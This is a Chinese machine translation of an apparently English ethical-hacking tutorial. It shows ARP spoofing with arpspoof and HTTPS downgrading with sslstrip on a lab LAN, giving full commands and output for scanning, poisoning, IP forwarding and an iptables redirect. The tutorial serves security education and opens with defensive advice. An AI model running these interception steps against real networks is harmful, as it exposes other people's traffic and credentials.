<html>
<head>
<title>ARP Spoofing &amp; SSL Strip</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ARP欺骗和SSL带</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3?source=collection_archive---------0-----------------------#2020-10-20">https://levelup.gitconnected.com/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3?source=collection_archive---------0-----------------------#2020-10-20</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="1928" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">道德黑客了解风险以防止攻击——重定向局域网流量和解密加密流量</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/859254ffc0c3b10ecead2885cf747a18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FdZxlv32UKZJSk2hohATMA.jpeg"/></div></div></figure><h2 id="a519" class="ku kv it bd kw kx ky dn kz la lb dp lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">ARP欺骗</h2><p id="68f9" class="pw-post-body-paragraph lq lr it ls b lt lu ju lv lw lx jx ly ld lz ma mb lh mc md me ll mf mg mh mi im bi translated">作为一名网络架构师，我怎么强调在第2层实施必要的安全预防措施都不为过。我见过许多网络，其中第2层只是作为标准实现的。你真的应该至少考虑802.1x认证、ARP检查和专用VLANs。不要只实施没有额外安全性的基本第2层网络，否则你会后悔的。</p><p id="8649" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">对于本教程，我将在192.168.1.1上使用我的测试受害者机器。在现实世界中，你可能不知道受害者的IP地址。使用名为网络映射器("<strong class="ls iu"> nmap </strong>")的工具，您可以执行网络扫描并检测网段上的大多数(如果不是全部)设备。</p><p id="f314" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">在此之前，我们应该真正了解网络上的默认网关(路由器)是什么。我们可以看到它是192.168.1.254。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="0ba5" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">route</strong><br/>Kernel IP routing table<br/>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br/>default         <strong class="mp iu">192.168.1.254</strong>   0.0.0.0         UG    100    0        0 eth0<br/>192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0</span></pre><p id="108b" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">我们还可以看到我的Kali实例运行在192.168.1.2上。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="569c" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">ip a</strong><br/>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br/>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br/>    inet 127.0.0.1/8 scope host lo<br/>       valid_lft forever preferred_lft forever<br/>    inet6 ::1/128 scope host <br/>       valid_lft forever preferred_lft forever<br/>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br/>    link/ether 08:00:27:24:30:b1 brd ff:ff:ff:ff:ff:ff<br/>    inet <strong class="mp iu">192.168.1.2/24</strong> brd 192.168.1.255 scope global noprefixroute eth0<br/>       valid_lft forever preferred_lft forever</span></pre><p id="e951" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">为了节省时间，我们希望从扫描中排除路由器和我们自己。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="e44d" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">nmap 192.168.1.1,3-253 -vv</strong><br/>Starting Nmap 7.91 ( <a class="ae mx" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2020-10-20 10:49 BST<br/>Initiating ARP Ping Scan at 10:49<br/>Scanning 252 hosts [1 port/host]</span></pre><p id="38a5" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">这可能需要一些时间，但会返回网段上的主机以及它们正在监听的端口。如果您愿意，还可以包含其他参数。</p><p id="f738" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">在现实世界中，您无法访问受害者机器，但出于兴趣，让我们看看当前的正常状态。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="bcb6" class="ku kv it mp b gy mt mu l mv mw">% <strong class="mp iu">arp 192.168.1.254</strong> <br/>? (192.168.1.254) at <strong class="mp iu">e8:ad:a6:d0:44:b1</strong> on en1 ifscope [ethernet]</span></pre><p id="d06d" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">我们可以看到，受害者目前认为路由器MAC是<strong class="ls iu"> e8:ad:a6:d0:44:b1 </strong>它是<strong class="ls iu">。</strong></p><p id="704b" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">我们还可以创建通往8.8.8.8的外部跟踪路由，下一跳是路由器。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="e60a" class="ku kv it mp b gy mt mu l mv mw">% <strong class="mp iu">traceroute 8.8.8.8</strong><br/>traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets<br/> 1  <strong class="mp iu">192.168.1.254</strong> (192.168.1.254)  1.407 ms  1.072 ms  1.081 ms</span></pre><p id="017e" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">所以到目前为止一切看起来都很好…</p><p id="aaf9" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">现在让我们回到我们的卡利实例。我们将通过提供接口“<strong class="ls iu"> eth0 </strong>”、受害者IP“<strong class="ls iu">192 . 168 . 1 . 1</strong>”、默认网关“<strong class="ls iu"> 192.168.1.254 </strong>”来运行“<strong class="ls iu"> arpspoof </strong>”。只要这个运行，ARP攻击就在发生。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="e512" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.254</strong><br/>8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at 8:0:27:24:30:b1<br/>8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 8:0:27:24:30:b1<br/>8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at 8:0:27:24:30:b1<br/>8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 8:0:27:24:30:b1<br/>8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at 8:0:27:24:30:b1</span></pre><p id="5daa" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">让我们看看受害者身上发生了什么…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="2151" class="ku kv it mp b gy mt mu l mv mw">% <strong class="mp iu">arp 192.168.1.254 </strong><br/>? (192.168.1.254) at <strong class="mp iu">8:0:27:24:30:b1</strong> on en1 ifscope [ethernet]</span></pre><p id="1551" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">这可不好。</p><p id="15fd" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">受害机现在认为默认网关路由器的MAC是<strong class="ls iu"> 8:0:27:24:30:b1 </strong>。实际默认网关是<strong class="ls iu"> e8:ad:a6:d0:44:b1 </strong>。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="8b91" class="ku kv it mp b gy mt mu l mv mw">% <strong class="mp iu">traceroute 8.8.8.8</strong><br/>traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets<br/> 1  <strong class="mp iu">192.168.1.2</strong> (192.168.1.2)  0.447 ms  0.267 ms  0.198 ms </span></pre><p id="1764" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">您现在可以看到，所有流量首先被路由到我的Kali实例。</p><p id="c847" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">这不是很好，因为默认情况下linux主机不会路由流量。如果不属于它的流量被定向到它，那么它将被丢弃。</p><p id="0ca1" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">为了做到这一点，我们需要将Kali配置为路由器，这样它就可以转发数据包。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="c3e6" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">echo "1" &gt; /proc/sys/net/ipv4/ip_forward</strong><br/>root@kali:~# <strong class="mp iu">cat /proc/sys/net/ipv4/ip_forward</strong><br/>1</span></pre><p id="98b2" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">现在让我们再次尝试受害者的<strong class="ls iu">追踪路线</strong>…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="e9eb" class="ku kv it mp b gy mt mu l mv mw">% <strong class="mp iu">traceroute 8.8.8.8</strong><br/>traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets<br/> 1  <strong class="mp iu">192.168.1.2</strong> (192.168.1.2)  0.447 ms  0.267 ms  0.198 ms<br/> 2  192.168.1.254 (192.168.1.254)  1.371 ms  1.164 ms  1.227 ms</span></pre><p id="82d9" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">来自我的受害者的流量现在通过我的Kali实例路由，除了稍微慢一点之外，几乎看不出来。</p><p id="01c1" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">出于兴趣，如果你想阻止ARP欺骗攻击，请按Ctrl+C，然后“<strong class="ls iu">ARP欺骗</strong>”工具会自动清除一切。受害者机器上的一切都会恢复正常。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="28d0" class="ku kv it mp b gy mt mu l mv mw">^C<strong class="mp iu">Cleaning up and re-arping targets...</strong><br/>8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at e8:ad:a6:e0:45:a1<br/>8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 28:f0:76:46:d1:3a<br/>8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at e8:ad:a6:e0:45:a1<br/>8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 28:f0:76:46:d1:3a</span></pre><p id="5ced" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">因此，所有流量现在都通过我们的Kali实例进行路由。今天，大多数网站都使用HTTPS/SSL加密。因此，除了看到受害者浏览的网站之外，你通过Kali实例看到的内容并不那么有趣。如果有一种方法可以使用“<strong class="ls iu">中间人</strong>攻击来即时解密流量，那就太好了。</p><p id="b112" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">这就是工具“<strong class="ls iu"> sslstrip </strong>”发挥作用的地方。请注意，现在许多浏览器都有预防措施来防止这种情况。并非所有浏览器都允许这种情况发生，所以受害者需要使用旧的或非标准的浏览器。我的意思是，这几天Chrome和Firefox不太可能返回任何结果。我没有试过Safari或Internet Explorer，但也许他们会。您将主要针对维护不良的IT基础设施或未得到妥善照管的设备。</p><h2 id="7d1f" class="ku kv it bd kw kx ky dn kz la lb dp lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">SSL带</h2><p id="dcca" class="pw-post-body-paragraph lq lr it ls b lt lu ju lv lw lx jx ly ld lz ma mb lh mc md me ll mf mg mh mi im bi translated">如果你试图从2020年开始在Kali中安装SSL Strip，你会注意到这不是一个简单的任务。你可能会发现自己在一个又一个错误中工作，但仍然没有成功。我设法让它工作如下。</p><ul class=""><li id="0784" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">从<a class="ae mx" href="https://github.com/moxie0/sslstrip" rel="noopener ugc nofollow" target="_blank"> Github repo </a>中克隆SSL带</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1a29" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">apt install git -y</strong><br/>Reading package lists... Done<br/>Building dependency tree       <br/>Reading state information... Done<br/>git is already the newest version (1:2.28.0-1).<br/>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><span id="15f6" class="ku kv it mp b gy nh mu l mv mw">root@kali:~# <strong class="mp iu">git clone </strong><a class="ae mx" href="https://github.com/moxie0/sslstrip" rel="noopener ugc nofollow" target="_blank"><strong class="mp iu">https://github.com/moxie0/sslstrip</strong></a><br/>Cloning into 'sslstrip'...<br/>remote: Enumerating objects: 42, done.<br/>remote: Total 42 (delta 0), reused 0 (delta 0), pack-reused 42<br/>Unpacking objects: 100% (42/42), 30.58 KiB | 1.27 MiB/s, done.</span></pre><ul class=""><li id="de3b" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">安装Python包管理器"<strong class="ls iu"> pip </strong>"</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1991" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">apt install python3-pip -y</strong><br/>Reading package lists... Done<br/>Building dependency tree       <br/>Reading state information... Done<br/>python3-pip is already the newest version (20.1.1-2).<br/>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span></pre><ul class=""><li id="5d17" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">使用“<strong class="ls iu"> pip3 </strong>”安装Python“<strong class="ls iu">virtualenv</strong>”。</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="b652" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">pip3 install virtualenv</strong><br/>Requirement already satisfied: virtualenv in /usr/local/lib/python3.8/dist-packages (20.0.35)<br/>Requirement already satisfied: six&lt;2,&gt;=1.9.0 in /usr/local/lib/python3.8/dist-packages (from virtualenv) (1.15.0)<br/>Requirement already satisfied: filelock&lt;4,&gt;=3.0.0 in /usr/local/lib/python3.8/dist-packages (from virtualenv) (3.0.12)<br/>Requirement already satisfied: distlib&lt;1,&gt;=0.3.1 in /usr/local/lib/python3.8/dist-packages (from virtualenv) (0.3.1)<br/>Requirement already satisfied: appdirs&lt;2,&gt;=1.4.3 in /usr/lib/python3/dist-packages (from virtualenv) (1.4.4)</span></pre><ul class=""><li id="b7bc" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">使用<strong class="ls iu"> Python 2 ← </strong>创建您的Python虚拟环境</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="2d2b" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">virtualenv -p python2 sslstripenv</strong><br/>created virtual environment CPython2.7.18.final.0-64 in 111ms<br/>  creator CPython2Posix(dest=/root/sslstripenv, clear=False, global=False)<br/>  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/root/.local/share/virtualenv)<br/>    added seed packages: pip==20.2.3, setuptools==44.1.1, wheel==0.35.1<br/>  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator</span></pre><ul class=""><li id="67bd" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">加载您的“<strong class="ls iu"> sslstripenv </strong>”虚拟环境。</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="fc52" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">. sslstripenv/bin/activate</strong><br/>(sslstripenv) root@kali:~#</span></pre><ul class=""><li id="8f80" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">转到Git克隆的"<strong class="ls iu"> sslstrip </strong>"目录。</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="0cc6" class="ku kv it mp b gy mt mu l mv mw">(sslstripenv) root@kali:~# <strong class="mp iu">cd sslstrip</strong><br/>(sslstripenv) root@kali:~/sslstrip#</span></pre><ul class=""><li id="9c67" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">使用“<strong class="ls iu"> pip </strong>”安装以下依赖项。</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="9035" class="ku kv it mp b gy mt mu l mv mw">(sslstripenv) root@kali:~/sslstrip# <strong class="mp iu">pip install Twisted pyOpenSSL service_identity</strong></span><span id="1812" class="ku kv it mp b gy nh mu l mv mw">*** INSTALLATION PROCESS ***</span></pre><ul class=""><li id="a5a9" class="my mz it ls b lt mj lw mk ld na lh nb ll nc mi nd ne nf ng bi translated">如果一切按计划进行，那么现在应该运行"<strong class="ls iu"> sslstrip.py </strong>"了。</li></ul><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="3f01" class="ku kv it mp b gy mt mu l mv mw">(sslstripenv) root@kali:~/sslstrip# <strong class="mp iu">python sslstrip.py -h</strong><br/>/root/sslstripenv/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.<br/>  from cryptography import x509</span><span id="cc18" class="ku kv it mp b gy nh mu l mv mw">sslstrip 0.9 by Moxie Marlinspike<br/>Usage: sslstrip &lt;options&gt;</span><span id="67a1" class="ku kv it mp b gy nh mu l mv mw">Options:<br/>-w &lt;filename&gt;, --write=&lt;filename&gt; Specify file to log to (optional).<br/>-p , --post                       Log only SSL POSTs. (default)<br/>-s , --ssl                        Log all SSL traffic to and from server.<br/>-a , --all                        Log all SSL and HTTP traffic to and from server.<br/>-l &lt;port&gt;, --listen=&lt;port&gt;        Port to listen on (default 10000).<br/>-f , --favicon                    Substitute a lock favicon on secure requests.<br/>-k , --killsessions               Kill sessions in progress.<br/>-h                                Print this help message.</span></pre><p id="884e" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">您可以忽略这个警告，因为“<strong class="ls iu"> sslstrip </strong>”目前似乎只适用于Python 2。如果你尝试使用Python和/或PIP版本3，你将打开pandoras问题箱。解决这个问题的方法是创建一个Python 2虚拟环境，然后它就可以工作了。</p><p id="7f43" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">如果你不熟悉Python虚拟环境，你可以输入"<strong class="ls iu"> deactivate </strong>"退出。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="62f6" class="ku kv it mp b gy mt mu l mv mw">(sslstripenv) root@kali:~/sslstrip# <strong class="mp iu">deactivate</strong><br/>root@kali:~/sslstrip#</span></pre><p id="c475" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">如果你想再次进入你做如下。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="7804" class="ku kv it mp b gy mt mu l mv mw">root@kali:~/sslstrip# <strong class="mp iu">cd</strong><br/>root@kali:~# <strong class="mp iu">. sslstripenv/bin/activate</strong><br/>(sslstripenv) root@kali:~# <strong class="mp iu">cd sslstrip</strong><br/>(sslstripenv) root@kali:~/sslstrip# <strong class="mp iu">python sslstrip.py -h</strong></span></pre><h2 id="ac5d" class="ku kv it bd kw kx ky dn kz la lb dp lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">基本用法</h2><p id="7edd" class="pw-post-body-paragraph lq lr it ls b lt lu ju lv lw lx jx ly ld lz ma mb lh mc md me ll mf mg mh mi im bi translated">"<strong class="ls iu"> sslstrip </strong>"监听特定端口上的流量，因此我们需要使用"<strong class="ls iu"> iptables </strong>"监听该端口上的HTTPS流量，并将其转发到可配置端口TCP 8080上的"<strong class="ls iu"> sslstrip </strong>"。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="8c8c" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</strong></span></pre><p id="6f96" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">让我们验证它是否存在…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="72bd" class="ku kv it mp b gy mt mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -L -v -n</strong><br/>Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)<br/> pkts bytes target     prot opt in     out     source               destination         <br/><strong class="mp iu">    0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 redir ports 8080</strong></span><span id="45ea" class="ku kv it mp b gy nh mu l mv mw">Chain INPUT (policy ACCEPT 0 packets, 0 bytes)<br/> pkts bytes target     prot opt in     out     source               destination</span><span id="5c6c" class="ku kv it mp b gy nh mu l mv mw">Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)<br/> pkts bytes target     prot opt in     out     source               destination</span><span id="29bb" class="ku kv it mp b gy nh mu l mv mw">Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)<br/> pkts bytes target     prot opt in     out     source               destination</span><span id="16a4" class="ku kv it mp b gy nh mu l mv mw">root@kali:~# <strong class="mp iu">iptables -t nat -L PREROUTING</strong><br/>Chain PREROUTING (policy ACCEPT)<br/>target     prot opt source               destination         <br/><strong class="mp iu">REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:http redir ports 8080</strong></span></pre><p id="eb8d" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">"<strong class="ls iu"> ssltrip </strong>"将HTTPS连接转换为HTTP，顾名思义就是剥离加密层。"<strong class="ls iu"> sslstrip </strong>"跟踪状态，来自客户端的未加密响应将以加密形式传递给服务器。</p><p id="2893" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">然后，您需要在已配置的端口上运行“<strong class="ls iu"> sslstrip </strong>”，在我们的例子中是<strong class="ls iu"> TCP 8080 </strong>。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="6c59" class="ku kv it mp b gy mt mu l mv mw">(sslstripenv) root@kali:~/sslstrip# <strong class="mp iu">python sslstrip.py -l 8080</strong><br/>/root/sslstripenv/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.<br/>  from cryptography import x509</span><span id="34bb" class="ku kv it mp b gy nh mu l mv mw">sslstrip 0.9 by Moxie Marlinspike running...</span></pre><p id="8c1e" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">现在，假设您使用ARP欺骗在您的Kali实例上引导流量，IP表配置正确，您正在运行SSL Strip，并且受害者正在使用易受攻击的浏览器，当他们浏览到HTTPS站点时，您应该会在此处看到日志记录。</p><p id="d0f2" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">一个好主意是打开另一个终端窗口和"<strong class="ls iu">tail</strong>" the "<strong class="ls iu">sslstrip</strong>"日志文件。这将允许您在不中断工具的情况下查看结果。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="043b" class="ku kv it mp b gy mt mu l mv mw">root@kali:~/sslstrip# <strong class="mp iu">tail -f -n 0 sslstrip.log</strong></span></pre><p id="f4eb" class="pw-post-body-paragraph lq lr it ls b lt mj ju lv lw mk jx ly ld ml ma mb lh mm md me ll mn mg mh mi im bi translated">为了进一步阅读，看看我写的关于这个话题的19个故事。</p><div class="ni nj gp gr nk"><div role="button" tabindex="0" class="ab bv gv cb fp nl nm bn nn ks ex"><div class="no l"><div class="ab q"><div class="l di"><img alt="Michael Whittle" class="l de bw np nq fe" src="../Images/f4d39d0c62b7f2e165491c1e2a8c6e26.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*efn30YXRNnd9uk7qbTOGnA.jpeg"/><div class="fb bw l np nq fc n aw fd"/></div><div class="hh l fo"><p class="bd b dl z fp fq fr fs ft fu fv fw dk translated">迈克尔·惠特尔</p></div></div><div class="nt nu gw l"><h2 class="bd iu tt my fp tu fr fs tv fu fw is bi translated">道德黑客培训课程</h2></div><div class="ab q"><div class="l fo"><a class="bd b be z bi tw au tx ty tz qh ua an eh ei ub uc ud el em eo de bk ep" href="https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----ea5f0cc892f3--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="ue l fo"><span class="bd b dl z dk">19 stories</span></div></div></div><div class="og dh oh fp ab oi fo di"><div class="di ny bv nz oa"><div class="dh l"><img alt="" class="dh" src="../Images/57c6829d9a7a0ff6d78e5d828845bb8c.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*UJZPySDP-tEonnesSAbLgA.png"/></div></div><div class="di ny bv ob oc od"><div class="dh l"><img alt="" class="dh" src="../Images/e2d3aa85ee76ceb2b889dd753c231b67.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*rt1tdkIaxU8p69xo_yz9zg.jpeg"/></div></div><div class="di bv oe of od"><div class="dh l"><img alt="" class="dh" src="../Images/6240cd235d84e9cd8cb158d7147a71f5.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*78Op5N9xBfarPgmmwpHCQQ.jpeg"/></div></div></div></div></div><h1 id="5b44" class="om kv it bd kw on oo op kz oq or os lc jz ot ka lg kc ou kd lk kf ov kg lo ow bi translated">迈克尔·惠特尔</h1><ul class=""><li id="5302" class="my mz it ls b lt lu lw lx ld ox lh oy ll oz mi nd ne nf ng bi translated"><strong class="ls iu"> <em class="pa">如果你喜欢这个，请</em> </strong> <a class="ae mx" href="https://whittle.medium.com/" rel="noopener"> <strong class="ls iu"> <em class="pa">跟我上媒</em> </strong> </a></li><li id="737a" class="my mz it ls b lt pb lw pc ld pd lh pe ll pf mi nd ne nf ng bi translated"><strong class="ls iu"> <em class="pa">更多有趣的文章，请</em> </strong> <a class="ae mx" href="https://medium.com/trading-data-analysis" rel="noopener"> <strong class="ls iu"> <em class="pa">关注我的刊物</em> </strong> </a></li><li id="5d7b" class="my mz it ls b lt pb lw pc ld pd lh pe ll pf mi nd ne nf ng bi translated"><strong class="ls iu"> <em class="pa">有兴趣合作吗？</em> </strong> <a class="ae mx" href="https://www.linkedin.com/in/miwhittle/" rel="noopener ugc nofollow" target="_blank"> <strong class="ls iu"> <em class="pa">让我们连线LinkedIn上的</em> </strong> </a></li><li id="e1a5" class="my mz it ls b lt pb lw pc ld pd lh pe ll pf mi nd ne nf ng bi translated"><strong class="ls iu"> <em class="pa">支持我和其他媒体作者</em> </strong> <a class="ae mx" href="https://whittle.medium.com/membership" rel="noopener"> <strong class="ls iu"> <em class="pa">在此报名</em> </strong> </a></li><li id="872e" class="my mz it ls b lt pb lw pc ld pd lh pe ll pf mi nd ne nf ng bi translated"><strong class="ls iu"> <em class="pa">请别忘了为文章鼓掌:)←谢谢！</em>T59】</strong></li></ul></div></div>    
</body>
</html>